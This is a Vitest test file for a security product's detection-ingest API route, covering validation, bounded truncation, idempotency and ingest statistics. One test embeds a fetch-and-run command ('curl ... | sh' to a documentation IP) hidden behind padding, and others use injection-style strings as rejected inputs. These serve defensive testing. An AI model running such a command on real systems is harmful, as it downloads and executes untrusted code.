import { beforeEach, describe, expect, it, vi } from "vitest";
import { NextRequest } from "next/server";
import { readFileSync } from "node:fs";
import path from "node:path";
import { createHash } from "node:crypto";

const db = vi.hoisted(() => ({
  agent: { findUnique: vi.fn(), update: vi.fn() },
  detection: { create: vi.fn(), findUnique: vi.fn() },
  $executeRaw: vi.fn(),
}));
vi.mock("@/lib/prisma", () => ({ prisma: db }));

import { POST } from "@/app/api/ingest/detection/route";
import {
  MAX_BODY_DEPTH,
  MAX_EVENTS,
  MAX_EVENT_ARRAY_ITEMS,
  MAX_EVENT_DEPTH,
  MAX_EVENT_KEYS,
  MAX_EVENT_KEY_BYTES,
  MAX_EVENT_STRING_BYTES,
  MAX_TITLE_BYTES,
  cutUtf8HeadTail,
  truncateUtf8,
} from "@/lib/detection-payload";

const headers = {
  "X-Proxy-Secret": "test-proxy-secret",
  "X-Client-Cert-Verified": "SUCCESS",
  "X-Client-Cert-Subject": "CN=agent-1,O=synthaea",
  "Content-Type": "application/json",
};


/** The `$executeRaw` calls that wrote `table`: the ingest stats (#899) share the mock with prevalence. */
const writesTo = (table: string) =>
  db.$executeRaw.mock.calls.filter((c) => String(c[0].sql).includes(table));
const stats = () => writesTo("ingest_stats").map((c) => c[0].values as unknown[]);

const post = (body: unknown, extraHeaders: Record<string, string> = {}) => POST(new NextRequest("http://localhost/api/ingest/detection", {
  method: "POST",
  headers: { ...headers, ...extraHeaders },
  body: JSON.stringify(body),
}));

beforeEach(() => {
  vi.clearAllMocks();
  process.env.NGINX_PROXY_SECRET = "test-proxy-secret";
  db.agent.findUnique.mockResolvedValue({ id: "agent-db", tenantId: "tenant-db" });
  db.agent.update.mockResolvedValue({});
  db.detection.create.mockResolvedValue({ id: "detection-db" });
  db.$executeRaw.mockResolvedValue(1);
});

describe("POST /api/ingest/detection", () => {
  it("accepts the current Rust schema's ML golden fixture", async () => {
    const fixturePath = path.resolve(
      __dirname,
      "../../../crates/schema/tests/fixtures/v34/detection_ml.json"
    );
    const response = await post(JSON.parse(readFileSync(fixturePath, "utf8")));
    expect(response.status).toBe(200);
    expect(db.detection.create).toHaveBeenCalledWith({ data: expect.objectContaining({
      technique: "ML",
      meta: expect.objectContaining({
        source: { engine: "ml", tier: 0, model_id: "t0-cmdline-linux", model_version: "2026.09.0" },
        model_id: "t0-cmdline-linux",
        attributions: [
          { feature: "entropy", value: 5.83, contribution: 0.41 },
          { feature: "max_token_length", value: 812, contribution: 0.27 },
        ],
      }),
    }) });
  });

  it("accepts schema::Detection and preserves source, attributions, and all evidence", async () => {
    const first = { type: "exec", meta: { timestamp_ns: 1_700_000_000_000_000_000 } };
    const second = { type: "connect", meta: { timestamp_ns: 1_700_000_000_100_000_000 } };
    const response = await post({
      timestamp_ns: 1_700_000_000_200_000_000,
      severity: "high",
      title: "Unusual process chain",
      source: { engine: "correlator", case_id: "42:python" },
      score: 0.91,
      attributions: [{ feature: "connect_count", value: 3, contribution: 0.4 }],
      techniques: ["T1059", "T1071"],
      events: [first, second],
    });

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({ status: "accepted" });
    expect(db.detection.create).toHaveBeenCalledWith({ data: expect.objectContaining({
      tenantId: "tenant-db",
      agentId: "agent-db",
      technique: "T1059",
      severity: "high",
      event: first,
      meta: {
        title: "Unusual process chain",
        source: { engine: "correlator", case_id: "42:python" },
        case_id: "42:python",
        score: 0.91,
        attributions: [{ feature: "connect_count", value: 3, contribution: 0.4 }],
        techniques: ["T1059", "T1071"],
        additional_events: [second],
      },
    }) });
  });

  it("accepts an IOC detection and keeps the indicator and feed provenance in meta", async () => {
    const source = {
      engine: "ioc",
      kind: "ip",
      indicator: "203.0.113.7",
      feed: "internal-blocklist",
      feed_version: "7",
    };
    const response = await post({
      timestamp_ns: 1_700_000_000_200_000_000,
      severity: "high",
      title: "Known-bad address",
      source,
      techniques: ["T1071"],
      events: [{ type: "connect" }],
    });

    expect(response.status).toBe(200);
    expect(db.detection.create).toHaveBeenCalledWith({ data: expect.objectContaining({
      technique: "T1071",
      meta: expect.objectContaining({ source, indicator: "203.0.113.7", feed: "internal-blocklist" }),
    }) });
  });

  it("rejects an IOC detection without feed provenance", async () => {
    const response = await post({
      timestamp_ns: 1_700_000_000_200_000_000,
      severity: "high",
      title: "Known-bad address",
      source: { engine: "ioc", kind: "ip", indicator: "203.0.113.7" },
      events: [],
    });
    expect(response.status).toBe(400);
    expect(db.detection.create).not.toHaveBeenCalled();
  });

  it("keeps accepting the legacy detection shape", async () => {
    const response = await post({
      timestamp_ns: 1_700_000_000_000_000_000,
      technique: "T1059",
      severity: "medium",
      event: { type: "exec" },
      meta: { hostname: "host-a" },
    });
    expect(response.status).toBe(200);
    expect(db.detection.create).toHaveBeenCalledWith({ data: expect.objectContaining({
      technique: "T1059",
      meta: { hostname: "host-a" },
    }) });
  });

  describe("bounded technique fields (#1058)", () => {
    const structured = (techniques: unknown) => ({
      timestamp_ns: 1_700_000_000_000_000_000,
      severity: "low",
      title: "Bounded technique",
      source: { engine: "rule", rule_id: "r" },
      techniques,
      events: [],
    });
    const legacy = (technique: unknown) => ({
      timestamp_ns: 1_700_000_000_000_000_000,
      technique,
      severity: "low",
      event: { type: "exec" },
      meta: {},
    });

    it("accepts every technique shape the agent emits today", async () => {
      for (const techniques of [
        ["T1059.001"],
        ["T1566.001", "T1204.002"],
        ["T1105", "T1059", "T1071"],
        ["BAYES"],
        ["IOC"],
        ["LOG-SOURCE"],
        ["RESPONSE-KILL"],
        [],
      ]) {
        expect((await post(structured(techniques))).status, JSON.stringify(techniques)).toBe(200);
      }
      for (const technique of ["T1059", "T1566.001/T1204.002", "T1105/T1059/T1071", "BAYES"]) {
        expect((await post(legacy(technique))).status, technique).toBe(200);
      }
    });

    it("rejects an oversized technique id before storage", async () => {
      expect((await post(structured(["T".repeat(65)]))).status).toBe(400);
      expect((await post(legacy("T".repeat(129)))).status).toBe(400);
      expect(db.detection.create).not.toHaveBeenCalled();
    });

    it("rejects more technique ids than any rule emits", async () => {
      const seventeen = Array.from({ length: 17 }, (_, i) => `T${1000 + i}`);
      expect((await post(structured(seventeen))).status).toBe(400);
      expect(db.detection.create).not.toHaveBeenCalled();
    });

    it("rejects characters no technique id carries", async () => {
      for (const bad of ["T1059 ", "T1059\n", "<script>", "T1059;DROP", "T1566.001/T1204.002"]) {
        expect((await post(structured([bad]))).status, JSON.stringify(bad)).toBe(400);
      }
      for (const bad of ["T1059 T1071", "T1059\u0000", ""]) {
        expect((await post(legacy(bad))).status, JSON.stringify(bad)).toBe(400);
      }
      expect(db.detection.create).not.toHaveBeenCalled();
    });
  });

  describe("bounded detection strings (#1060)", () => {
    const structured = (overrides: Record<string, unknown>) => ({
      timestamp_ns: 1_700_000_000_000_000_000,
      severity: "high",
      title: "Bounded strings",
      source: { engine: "rule", rule_id: "r" },
      techniques: [],
      events: [],
      ...overrides,
    });
    const stored = () => db.detection.create.mock.calls[0][0].data.meta;

    it("keeps a title cut at its bound, so a padded command line cannot erase the detection", async () => {
      const title = `T1059 cmdline=${"A".repeat(3 * MAX_TITLE_BYTES)}`;
      expect((await post(structured({ title }))).status).toBe(200);
      const kept: string = stored().title;
      expect(kept.startsWith("T1059 cmdline=AAAA")).toBe(true);
      expect(kept).toContain(` … [truncated, ${title.length} bytes] … `);
      expect(Buffer.byteLength(kept)).toBeLessThanOrEqual(MAX_TITLE_BYTES);
    });

    it("keeps a correlator case id cut at its bound, for an image named to the NTFS limit", async () => {
      const longest = `12345:${"é".repeat(255)}`;
      expect((await post(structured({ source: { engine: "correlator", case_id: longest } }))).status).toBe(200);
      expect(stored().case_id).toBe(longest);

      vi.clearAllMocks();
      db.agent.findUnique.mockResolvedValue({ id: "agent-db", tenantId: "tenant-db" });
      db.detection.create.mockResolvedValue({ id: "detection-db" });
      const padded = `12345:${"x".repeat(5000)}`;
      expect((await post(structured({ source: { engine: "correlator", case_id: padded } }))).status).toBe(200);
      expect(stored().case_id).toMatch(/^12345:x+… \[truncated, 5006 bytes\]$/);
      expect(Buffer.byteLength(stored().case_id)).toBeLessThanOrEqual(1024);
    });

    it("refuses a key reused for a different title that cuts to the same stored one", async () => {
      // Same length, same head and tail, different middle cut out: both store the same title, so
      // only a hash of the body as sent tells a retry from different evidence.
      const head = `T1059 cmdline=${"A".repeat(MAX_TITLE_BYTES)}`;
      const tail = "Z".repeat(MAX_TITLE_BYTES);
      const first = structured({ title: `${head}-first-${tail}` });
      const other = structured({ title: `${head}-other-${tail}` });
      const key = { "Idempotency-Key": "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a" };
      expect((await post(first, key)).status).toBe(200);
      const { ingestPayloadHash, meta } = db.detection.create.mock.calls[0][0].data;

      db.detection.create.mockRejectedValueOnce({ code: "P2002" });
      db.detection.findUnique.mockResolvedValueOnce({ ingestPayloadHash });
      expect((await post(other, key)).status).toBe(409);
      expect(db.detection.create.mock.calls[1][0].data.meta.title).toBe(meta.title);

      db.detection.create.mockRejectedValueOnce({ code: "P2002" });
      db.detection.findUnique.mockResolvedValueOnce({ ingestPayloadHash });
      expect((await post(first, key)).status, "a true retry is still accepted").toBe(200);
    });

    it("keeps an event whose command line is padded, cut and marked, so the padding cannot erase it", async () => {
      const cmdline = `sh -c ${"\u0001".repeat(3 * MAX_EVENT_STRING_BYTES)}`;
      const exec = { type: "exec", cmdline, argv: ["sh", "-c", cmdline.slice(6)] };
      expect((await post(structured({ events: [exec] }))).status).toBe(200);
      const { event, meta } = db.detection.create.mock.calls[0][0].data;
      expect(event.cmdline.startsWith("sh -c \u0001")).toBe(true);
      expect(event.cmdline).toMatch(/ … \[truncated, \d+ bytes\] … /);
      expect(Buffer.byteLength(event.cmdline)).toBeLessThanOrEqual(MAX_EVENT_STRING_BYTES);
      expect(event.argv.slice(0, 2)).toEqual(["sh", "-c"]);
      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 2, cutArrays: 0, nulStrings: 0 });
    });

    it("keeps the trigger and the first evidence when a detection carries more events than any rule emits", async () => {
      const events = Array.from({ length: MAX_EVENTS + 50 }, (_, i) => ({ type: "file_rename", n: i }));
      expect((await post(structured({ events }))).status).toBe(200);
      const { event, meta } = db.detection.create.mock.calls[0][0].data;
      expect(event.n).toBe(0);
      expect(meta.additional_events).toHaveLength(MAX_EVENTS - 1);
      expect(meta.events_cut).toEqual({ droppedEvents: 50, cutStrings: 0, cutArrays: 0, nulStrings: 0 });
    });

    it("keeps a ransomware damage manifest whole: 101 events is within the bound", async () => {
      const events = Array.from({ length: 101 }, (_, i) => ({ type: "file_rename", n: i }));
      expect((await post(structured({ events }))).status).toBe(200);
      const { meta } = db.detection.create.mock.calls[0][0].data;
      expect(meta.additional_events).toHaveLength(100);
      expect(meta.events_cut).toBeUndefined();
    });

    it("cuts an argv flood to its bound instead of refusing the event", async () => {
      const argv = Array.from({ length: MAX_EVENT_ARRAY_ITEMS + 10 }, () => "");
      expect((await post(structured({ events: [{ type: "exec", argv }] }))).status).toBe(200);
      const { event, meta } = db.detection.create.mock.calls[0][0].data;
      expect(event.argv).toHaveLength(MAX_EVENT_ARRAY_ITEMS);
      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 0, cutArrays: 1, nulStrings: 0 });
    });

    it("refuses an event nested deeper than any schema event, which no monitored process can cause", async () => {
      let deep: Record<string, unknown> = { leaf: 1 };
      for (let i = 0; i < MAX_EVENT_DEPTH; i++) deep = { deep };
      expect((await post(structured({ events: [deep] }))).status).toBe(400);
      expect(db.detection.create).not.toHaveBeenCalled();
    });

    it("bounds the legacy shape's event the same way", async () => {
      const response = await post({
        timestamp_ns: 1_700_000_000_000_000_000,
        technique: "T1059",
        severity: "medium",
        event: { type: "exec", cmdline: "A".repeat(2 * MAX_EVENT_STRING_BYTES) },
        meta: { hostname: "host-a" },
      });
      expect(response.status).toBe(200);
      const { event, meta } = db.detection.create.mock.calls[0][0].data;
      expect(event.cmdline).toMatch(/ … \[truncated, \d+ bytes\] … /);
      expect(meta).toEqual({
        hostname: "host-a",
        events_cut: { droppedEvents: 0, cutStrings: 1, cutArrays: 0, nulStrings: 0 },
      });
    });

    it("never splits a character when it cuts", () => {
      // "é" is two bytes, "😀" four: a head of 5 bytes lands inside one of them.
      const marker = (n: number) => `… [truncated, ${n} bytes]`;
      const room = (n: number) => 5 + Buffer.byteLength(marker(n));
      const pad = "x".repeat(40);
      expect(truncateUtf8(`éé😀${pad}`, room(48))).toBe(`éé${marker(48)}`);
      expect(truncateUtf8(`ééé${pad}`, room(46))).toBe(`éé${marker(46)}`);
      expect(truncateUtf8("short", 5)).toBe("short");

      // Head and tail: 5 + 5 bytes around the marker, both cuts inside a character.
      const middle = (n: number) => ` … [truncated, ${n} bytes] … `;
      const value = `😀é${pad}😀é`;
      const bytes = Buffer.byteLength(value);
      const cut = cutUtf8HeadTail(value, 10 + Buffer.byteLength(middle(bytes)));
      // The head backs off to 4 bytes; the tail moves forward past the 😀 it starts inside.
      expect(cut).toBe(`😀${middle(bytes)}é`);
      expect(cut).not.toContain("�");
    });

    it("keeps the payload a process places after its padding, in a string, an argv and the title", async () => {
      const payload = "curl http://203.0.113.7/x | sh";
      const cmdline = `bash -c '${" ".repeat(70 * 1024)}; ${payload}'`;
      const argv = [...Array.from({ length: MAX_EVENT_ARRAY_ITEMS + 5 }, () => ""), payload];
      const title = `T1059 cmdline=${cmdline}`;
      expect((await post(structured({ title, events: [{ type: "exec", cmdline, argv }] }))).status).toBe(200);
      const { event, meta } = db.detection.create.mock.calls[0][0].data;
      expect(event.cmdline.startsWith("bash -c '")).toBe(true);
      expect(event.cmdline.endsWith(`; ${payload}'`)).toBe(true);
      expect(event.argv).toHaveLength(MAX_EVENT_ARRAY_ITEMS);
      expect(event.argv.at(-1)).toBe(payload);
      expect(meta.title.startsWith("T1059 cmdline=bash")).toBe(true);
      expect(meta.title.endsWith(`; ${payload}'`)).toBe(true);
    });

    it("keeps exactly MAX_EVENTS events and cuts the next one", async () => {
      const events = (n: number) => Array.from({ length: n }, (_, i) => ({ type: "file_rename", n: i }));
      expect((await post(structured({ events: events(MAX_EVENTS) }))).status).toBe(200);
      expect(stored().additional_events).toHaveLength(MAX_EVENTS - 1);
      expect(stored().events_cut).toBeUndefined();

      vi.clearAllMocks();
      db.detection.create.mockResolvedValue({ id: "detection-db" });
      expect((await post(structured({ events: events(MAX_EVENTS + 1) }))).status).toBe(200);
      expect(stored().additional_events).toHaveLength(MAX_EVENTS - 1);
      expect(stored().events_cut.droppedEvents).toBe(1);
    });

    it("keeps a string exactly at its bound and cuts one byte more", async () => {
      const exact = "A".repeat(MAX_EVENT_STRING_BYTES);
      expect((await post(structured({ events: [{ type: "exec", cmdline: exact }] }))).status).toBe(200);
      expect(db.detection.create.mock.calls[0][0].data.event.cmdline).toBe(exact);
      expect(stored().events_cut).toBeUndefined();

      vi.clearAllMocks();
      db.detection.create.mockResolvedValue({ id: "detection-db" });
      expect((await post(structured({ events: [{ type: "exec", cmdline: `${exact}B` }] }))).status).toBe(200);
      const kept: string = db.detection.create.mock.calls[0][0].data.event.cmdline;
      expect(Buffer.byteLength(kept)).toBeLessThanOrEqual(MAX_EVENT_STRING_BYTES);
      expect(kept.endsWith("AB")).toBe(true);
      expect(stored().events_cut.cutStrings).toBe(1);
    });

    it("keeps an array exactly at its bound and cuts one item more, head and tail kept", async () => {
      const argv = Array.from({ length: MAX_EVENT_ARRAY_ITEMS }, (_, i) => String(i));
      expect((await post(structured({ events: [{ type: "exec", argv }] }))).status).toBe(200);
      expect(db.detection.create.mock.calls[0][0].data.event.argv).toEqual(argv);
      expect(stored().events_cut).toBeUndefined();

      vi.clearAllMocks();
      db.detection.create.mockResolvedValue({ id: "detection-db" });
      expect((await post(structured({ events: [{ type: "exec", argv: [...argv, "last"] }] }))).status).toBe(200);
      const kept: string[] = db.detection.create.mock.calls[0][0].data.event.argv;
      expect(kept).toHaveLength(MAX_EVENT_ARRAY_ITEMS);
      expect(kept[0]).toBe("0");
      expect(kept.at(-1)).toBe("last");
      expect(stored().events_cut.cutArrays).toBe(1);
    });

    it("accepts an event nested exactly MAX_EVENT_DEPTH levels deep", async () => {
      // The event object is level 1; each wrapper adds one.
      let deep: Record<string, unknown> = { leaf: 1 };
      for (let i = 1; i < MAX_EVENT_DEPTH; i++) deep = { deep };
      expect((await post(structured({ events: [deep] }))).status).toBe(200);
    });

    it("cuts a non-ASCII string through the route without splitting a character", async () => {
      const cmdline = "é".repeat(MAX_EVENT_STRING_BYTES) + "😀".repeat(1000);
      expect((await post(structured({ events: [{ type: "exec", cmdline }] }))).status).toBe(200);
      const kept: string = db.detection.create.mock.calls[0][0].data.event.cmdline;
      expect(kept.startsWith("éé")).toBe(true);
      expect(kept.endsWith("😀😀")).toBe(true);
      expect(kept).not.toContain("�");
      expect(Buffer.byteLength(kept)).toBeLessThanOrEqual(MAX_EVENT_STRING_BYTES);
    });

    it("accepts a keyed retry of a cut detection: the hash is of the body as sent, before the cut", async () => {
      const body = structured({ events: [{ type: "exec", cmdline: "A".repeat(2 * MAX_EVENT_STRING_BYTES) }] });
      const key = { "Idempotency-Key": "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a" };
      expect((await post(body, key)).status).toBe(200);
      const { ingestPayloadHash } = db.detection.create.mock.calls[0][0].data;
      expect(ingestPayloadHash).toBe(createHash("sha256").update(JSON.stringify(body)).digest("hex"));

      db.detection.create.mockRejectedValueOnce({ code: "P2002" });
      db.detection.findUnique.mockResolvedValueOnce({ ingestPayloadHash });
      expect((await post(body, key)).status).toBe(200);
    });

    it("refuses an event key longer than any schema field name, and accepts one at the bound", async () => {
      const at = "k".repeat(MAX_EVENT_KEY_BYTES);
      expect((await post(structured({ events: [{ type: "exec", [at]: 1 }] }))).status).toBe(200);
      vi.clearAllMocks();
      db.detection.create.mockResolvedValue({ id: "detection-db" });
      expect((await post(structured({ events: [{ type: "exec", [`${at}k`]: 1 }] }))).status).toBe(400);
      const huge = { type: "exec", nested: { ["k".repeat(5_000_000)]: 1 } };
      expect((await post(structured({ events: [huge] }))).status).toBe(400);
      expect(db.detection.create).not.toHaveBeenCalled();
    });

    it("refuses an object with more keys than any schema event, and accepts one at the bound", async () => {
      const keys = (n: number) => Object.fromEntries(Array.from({ length: n }, (_, i) => [`k${i}`, i]));
      expect((await post(structured({ events: [keys(MAX_EVENT_KEYS)] }))).status).toBe(200);
      vi.clearAllMocks();
      db.detection.create.mockResolvedValue({ id: "detection-db" });
      expect((await post(structured({ events: [keys(MAX_EVENT_KEYS + 1)] }))).status).toBe(400);
      expect((await post(structured({ events: [{ type: "exec", env: keys(300_000) }] }))).status).toBe(400);
      expect(db.detection.create).not.toHaveBeenCalled();
    });

    it("refuses a body nested past what JSON.stringify can hash with a 400, not a 500", async () => {
      const nested = (levels: number) => {
        let deep: unknown = 1;
        for (let i = 0; i < levels; i++) deep = [deep];
        return deep;
      };
      // 20,000 levels in an unknown key, which zod strips: past the ~10,000 at which the route's
      // JSON.stringify of the raw body throws. Built as text, since stringifying it here would too.
      const deepBody = `{"timestamp_ns":1,"severity":"low","title":"t",`
        + `"source":{"engine":"rule","rule_id":"r"},"events":[],`
        + `"unknown":${"[".repeat(20_000)}1${"]".repeat(20_000)}}`;
      const response = await POST(new NextRequest("http://localhost/api/ingest/detection", {
        method: "POST",
        headers: { ...headers, "Idempotency-Key": "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a" },
        body: deepBody,
      }));
      expect(response.status).toBe(400);
      // The body is level 1 and the innermost array holds a number, so `levels` arrays reach
      // level `levels + 1`.
      expect((await post({ ...structured({}), unknown: nested(MAX_BODY_DEPTH) })).status).toBe(400);
      expect((await post({ ...structured({}), unknown: nested(MAX_BODY_DEPTH - 1) })).status).toBe(200);
      expect(db.detection.create).toHaveBeenCalledTimes(1);
    });

    it("bounds the legacy meta like an event", async () => {
      const legacy = (meta: Record<string, unknown>) => ({
        timestamp_ns: 1_700_000_000_000_000_000,
        technique: "T1059",
        severity: "medium",
        event: { type: "exec" },
        meta,
      });
      expect((await post(legacy({ hostname: "host-a", note: "N".repeat(2 * MAX_EVENT_STRING_BYTES) }))).status).toBe(200);
      const { meta } = db.detection.create.mock.calls[0][0].data;
      expect(meta.hostname).toBe("host-a");
      expect(Buffer.byteLength(meta.note)).toBeLessThanOrEqual(MAX_EVENT_STRING_BYTES);
      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 1, cutArrays: 0, nulStrings: 0 });

      vi.clearAllMocks();
      db.detection.create.mockResolvedValue({ id: "detection-db" });
      expect((await post(legacy({ ["k".repeat(MAX_EVENT_KEY_BYTES + 1)]: 1 }))).status).toBe(400);
      expect(db.detection.create).not.toHaveBeenCalled();
    });

    it("replaces a NUL, which jsonb cannot store, instead of failing the insert", async () => {
      const response = await post(structured({
        title: "T1059 name=a\u0000b",
        events: [{ type: "dns_query", query: "evil\u0000.example" }],
      }));
      expect(response.status).toBe(200);
      const { event, meta } = db.detection.create.mock.calls[0][0].data;
      expect(event.query).toBe("evil�.example");
      expect(meta.title).toBe("T1059 name=a�b");
      expect(meta.events_cut).toEqual({ droppedEvents: 0, cutStrings: 0, cutArrays: 0, nulStrings: 1 });
    });

    it("marks a detection the agent already shortened, though it arrives under every bound", async () => {
      const title = "[events shortened from 21600826 bytes] pid=15271 comm=python3: base64 decode";
      expect((await post(structured({ title, events: [{ type: "exec" }] }))).status).toBe(200);
      expect(stored().events_cut).toEqual({
        droppedEvents: 0, cutStrings: 0, cutArrays: 0, nulStrings: 0, agentShortenedFromBytes: 21600826,
      });
    });

    it("logs which agent's evidence was cut, with counts and no payload", async () => {
      const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
      const padded = "S".repeat(2 * MAX_EVENT_STRING_BYTES);
      expect((await post(structured({ events: [{ type: "exec", cmdline: padded }] }))).status).toBe(200);
      expect(warn).toHaveBeenCalledTimes(1);
      const line = warn.mock.calls[0].join(" ");
      expect(line).toContain('"agentId":"agent-db"');
      expect(line).toContain('"cutStrings":1');
      expect(line).not.toContain("SSSS");
      warn.mockClear();
      expect((await post(structured({ events: [{ type: "exec", cmdline: "ls" }] }))).status).toBe(200);
      expect(warn).not.toHaveBeenCalled();
      warn.mockRestore();
    });

    it("mirrors MAX_EVENTS in the agent's SERVER_MAX_EVENTS, which bounds the damage manifest", () => {
      const sink = readFileSync(path.resolve(__dirname, "../../../agent/src/sink.rs"), "utf8");
      const mirrored = /const SERVER_MAX_EVENTS: usize = (\d+);/.exec(sink);
      expect(mirrored, "SERVER_MAX_EVENTS in agent/src/sink.rs").not.toBeNull();
      expect(Number(mirrored?.[1])).toBe(MAX_EVENTS);
    });

    it("refuses an oversized identifier that comes from shipped content", async () => {
      for (const source of [
        { engine: "rule", rule_id: "r".repeat(257) },
        { engine: "sigma", rule_id: "s".repeat(257) },
        { engine: "yara", rule_name: "y".repeat(129) },
        { engine: "ml", tier: 0, model_id: "m".repeat(129), model_version: "1" },
        { engine: "ml", tier: 0, model_id: "m", model_version: "1".repeat(129) },
        { engine: "ioc", kind: "domain", indicator: "d".repeat(257), feed: "f", feed_version: "1" },
        { engine: "ioc", kind: "domain", indicator: "a.example", feed: "f".repeat(65), feed_version: "1" },
        { engine: "ioc", kind: "domain", indicator: "a.example", feed: "f", feed_version: "1".repeat(65) },
        { engine: "ioc", kind: "domain", indicator: "a.example", feed: "f", feed_version: "1", reference: "r".repeat(2049) },
      ]) {
        expect((await post(structured({ source }))).status, JSON.stringify(source).slice(0, 80)).toBe(400);
      }
      expect(db.detection.create).not.toHaveBeenCalled();
    });

    it("accepts identifiers at their bounds", async () => {
      for (const source of [
        { engine: "rule", rule_id: "r".repeat(256) },
        { engine: "yara", rule_name: "y".repeat(128) },
        { engine: "ioc", kind: "domain", indicator: `${"a".repeat(249)}.com`, feed: "f".repeat(64), feed_version: "1".repeat(64) },
      ]) {
        expect((await post(structured({ source }))).status, JSON.stringify(source).slice(0, 80)).toBe(200);
      }
    });

    it("counts feed names in characters, as the agent cuts them", async () => {
      // 64 non-BMP characters: within the agent's 64-char cut, 128 UTF-16 units.
      const feed = "😀".repeat(64);
      const source = { engine: "ioc", kind: "domain", indicator: "a.example", feed, feed_version: feed };
      expect((await post(structured({ source }))).status).toBe(200);
      const over = { ...source, feed: "😀".repeat(65) };
      expect((await post(structured({ source: over }))).status).toBe(400);
    });

    it("refuses attributions past the model bounds", async () => {
      const ml = { engine: "ml", tier: 1, model_id: "m", model_version: "1" };
      const attribution = (feature: string) => ({ feature, value: 1, contribution: 0.1 });
      expect((await post(structured({ source: ml, attributions: [attribution("f".repeat(129))] }))).status).toBe(400);
      const many = Array.from({ length: 65 }, (_, i) => attribution(`f${i}`));
      expect((await post(structured({ source: ml, attributions: many }))).status).toBe(400);
      expect(db.detection.create).not.toHaveBeenCalled();
    });
  });

  it("rejects malformed structured attributions before storage", async () => {
    const response = await post({
      timestamp_ns: 1_700_000_000_000_000_000,
      severity: "high",
      title: "Bad attribution",
      source: { engine: "ml", tier: 1, model_id: "m", model_version: "1" },
      attributions: [{ feature: "x", value: "not a number", contribution: 0.5 }],
      techniques: [],
      events: [],
    });
    expect(response.status).toBe(400);
    expect(db.detection.create).not.toHaveBeenCalled();
  });

  it("stores a retry key scoped to the enrolled agent", async () => {
    const body = {
      timestamp_ns: 1_700_000_000_000_000_000,
      technique: "T1059",
      severity: "medium",
      event: { type: "exec" },
      meta: {},
    };
    const key = "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a";
    const response = await post(body, { "Idempotency-Key": key });
    expect(response.status).toBe(200);
    expect(db.detection.create).toHaveBeenCalledWith({ data: expect.objectContaining({
      agentId: "agent-db",
      ingestId: key,
      ingestPayloadHash: createHash("sha256").update(JSON.stringify(body)).digest("hex"),
    }) });
  });

  it("acknowledges a retried detection without storing or counting it twice", async () => {
    const body = {
      timestamp_ns: 1_700_000_000_000_000_000,
      technique: "T1059",
      severity: "high",
      event: { type: "exec" },
      meta: {},
    };
    const key = "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a";
    const hash = createHash("sha256").update(JSON.stringify(body)).digest("hex");
    db.detection.create.mockRejectedValueOnce({ code: "P2002" });
    db.detection.findUnique.mockResolvedValueOnce({ ingestPayloadHash: hash });

    const response = await post(body, { "Idempotency-Key": key });
    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({ status: "accepted" });
    expect(db.detection.findUnique).toHaveBeenCalledWith({
      where: { agentId_ingestId: { agentId: "agent-db", ingestId: key } },
      select: { ingestPayloadHash: true },
    });
    expect(writesTo("prevalence_sightings")).toHaveLength(0);
  });

  it("rejects reuse of an idempotency key for different evidence", async () => {
    db.detection.create.mockRejectedValueOnce({ code: "P2002" });
    db.detection.findUnique.mockResolvedValueOnce({ ingestPayloadHash: "other" });
    const response = await post({
      timestamp_ns: 1_700_000_000_000_000_000,
      technique: "T1059",
      severity: "high",
      event: { type: "exec" },
      meta: {},
    }, { "Idempotency-Key": "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a" });
    expect(response.status).toBe(409);
    expect(writesTo("prevalence_sightings")).toHaveLength(0);
  });

  it("rejects a malformed idempotency key", async () => {
    const response = await post({
      timestamp_ns: 1_700_000_000_000_000_000,
      technique: "T1059",
      severity: "high",
      event: {},
      meta: {},
    }, { "Idempotency-Key": "bad" });
    expect(response.status).toBe(400);
    expect(db.detection.create).not.toHaveBeenCalled();
  });

  describe("ingest health (#899)", () => {
    const body = {
      timestamp_ns: 1_700_000_000_000_000_000,
      technique: "T1059",
      severity: "high",
      event: { type: "exec" },
      meta: {},
    };
    // tenant, agent, kind, bucket, received, accepted, skipped, refused_4xx, refused_5xx, lag_max_ms, last_accepted_at
    const counted = () => stats().map((v) => [v[2], ...v.slice(4, 9)]);

    it("counts a stored detection as accepted, with its lag", async () => {
      await post(body);
      const [row] = stats();
      expect(row.slice(0, 3)).toEqual(["tenant-db", "agent-db", "detection"]);
      expect(counted()).toEqual([["detection", 1, 1, 0, 0, 0]]);
      expect(row[10]).toBe(1); // one event time counted
      expect(row[11]).toBeGreaterThan(0); // lag_max_ms
    });

    it("counts a reused idempotency key as a 4xx refusal", async () => {
      db.detection.create.mockRejectedValueOnce({ code: "P2002" });
      db.detection.findUnique.mockResolvedValueOnce({ ingestPayloadHash: "other" });
      await post(body, { "Idempotency-Key": "b9628fc1-2134-4d4d-bbe6-83fdd1929d7a" });
      expect(counted()).toEqual([["detection", 1, 0, 0, 1, 0]]);
    });

    it("counts an invalid payload as a 4xx and a storage failure as a 5xx", async () => {
      await post({ ...body, technique: undefined });
      db.detection.create.mockRejectedValueOnce(new Error("db down"));
      await post(body);
      expect(counted()).toEqual([
        ["detection", 1, 0, 0, 1, 0],
        ["detection", 1, 0, 0, 0, 1],
      ]);
    });

    it("counts nothing for an agent that is not enrolled, and still answers when stats fail", async () => {
      db.agent.findUnique.mockResolvedValueOnce(null);
      expect((await post(body)).status).toBe(403);
      expect(stats()).toHaveLength(0);
      db.$executeRaw.mockRejectedValue(new Error("db down"));
      expect((await post(body)).status).toBe(200);
    });
  });
});
